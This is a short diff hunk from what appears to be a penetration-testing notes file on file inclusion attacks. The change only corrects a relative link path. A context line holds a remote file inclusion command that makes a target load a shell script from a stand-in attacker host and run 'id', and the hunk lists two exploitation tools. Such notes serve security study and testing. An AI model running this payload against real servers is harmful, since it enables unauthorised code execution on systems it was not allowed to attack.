@@ -493,7 +493,7 @@ curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
 - LFISuite: https://github.com/D35m0nd142/LFISuite
 - Kadimus: https://github.com/P0cL4bs/Kadimus
 
-> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../07%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)
+> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../08%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)
 
 ---
 
